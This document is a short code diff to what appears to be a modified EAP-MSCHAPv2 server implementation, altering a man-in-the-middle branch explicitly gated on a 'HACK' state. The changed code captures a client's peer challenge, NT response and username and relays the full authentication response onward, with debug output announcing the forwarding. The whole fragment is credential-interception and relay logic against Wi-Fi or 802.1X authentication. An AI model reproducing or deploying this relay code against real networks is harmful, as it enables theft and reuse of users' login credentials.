@@ -441,14 +441,9 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
 	wpa_hexdump_ascii(MSG_MSGDUMP, "EAP-MSCHAPV2: Name", name, name_len);
 
 	if (lm_state == HACK && self->mitm_protocol_state == 0x4) {
-		struct wpabuf *data;
-		data = wpabuf_alloc(16 + 24 + name_len);
-		wpabuf_put_data(data, peer_challenge, 16);
-		wpabuf_put_data(data, nt_response, 24);
-		wpabuf_put_data(data, name, name_len);
-		self->mitm_data = data;
+		self->mitm_data = wpabuf_dup(respData);
 		self->mitm_protocol_state = 0x6;
-		eap_example_mitm_peer_tx(self);
+		eap_example_mitm_server_tx(self);
 
 		wpa_printf(MSG_DEBUG,
 			   "MITM: Send MSCHAPv2 Peer Challenge, NT Response "
